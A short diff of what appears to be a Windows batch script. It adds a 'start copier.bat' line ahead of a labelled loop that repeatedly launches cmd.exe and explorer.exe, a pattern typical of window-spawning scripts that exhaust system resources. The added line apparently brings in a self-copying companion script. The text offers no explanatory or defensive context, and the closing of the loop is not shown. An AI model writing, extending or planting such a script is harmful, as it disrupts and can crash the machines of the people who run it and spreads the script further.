@@ -1,3 +1,4 @@
+start copier.bat
 :loop
 start cmd.exe
 start explorer.exe
